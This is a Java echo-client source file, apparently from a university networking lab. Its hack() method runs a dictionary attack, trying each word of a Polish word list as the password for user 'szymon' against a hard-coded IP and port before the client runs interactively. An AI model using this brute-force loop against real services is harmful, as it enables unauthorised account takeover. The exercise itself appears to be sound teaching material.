package Lab8;

import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.net.UnknownHostException;

public class MyEchoClient {
	public static Socket echoSocket = null;
	public static PrintWriter out = null;
	public static BufferedReader in = null;

	public static void hack() throws IOException {

		BufferedReader bf = null;
		bf = new BufferedReader(new FileReader("polish-dic.txt"));
		String line = null;
		String actualPassword = null;
		while ((line = bf.readLine()) != null) {
			echoSocket = new Socket("149.156.98.73", 3000);
			out = new PrintWriter(echoSocket.getOutputStream(), true);
			in = new BufferedReader(new InputStreamReader(
					echoSocket.getInputStream()));
			String[] splittedLine = line.split("/");
			actualPassword = splittedLine[0];
			out.println("LOGIN szymon;" + actualPassword);
			out.flush();
			System.out.println(actualPassword);
			if (in.readLine().equals("false") == false) {
				System.out.println("!" + actualPassword + "!");
				break;
			}
			out.close();
			in.close();
			echoSocket.close();
			System.out.println("AA");
		}

		if (bf != null)
			bf.close();
	}

	public static void main(String[] args) throws IOException {

		hack();

		try {
			echoSocket = new Socket("149.156.98.73", 3000);
			out = new PrintWriter(echoSocket.getOutputStream(), true);
			in = new BufferedReader(new InputStreamReader(
					echoSocket.getInputStream()));
		} catch (UnknownHostException e) {
			System.err.println("Don't know about host: localhost.");
			System.exit(1);
		} catch (IOException e) {
			System.err.println("Couldn't get I/O for "
					+ "the connection to: localhost.");
			System.exit(1);
		}

		BufferedReader stdIn = new BufferedReader(new InputStreamReader(
				System.in));
		String userInput;

		System.out.println("Type a message: ");
		while ((userInput = stdIn.readLine()) != null) {
			out.println(userInput);
			System.out.println("echo: " + in.readLine());
		}

		out.close();
		in.close();
		stdIn.close();
		echoSocket.close();

	}

}
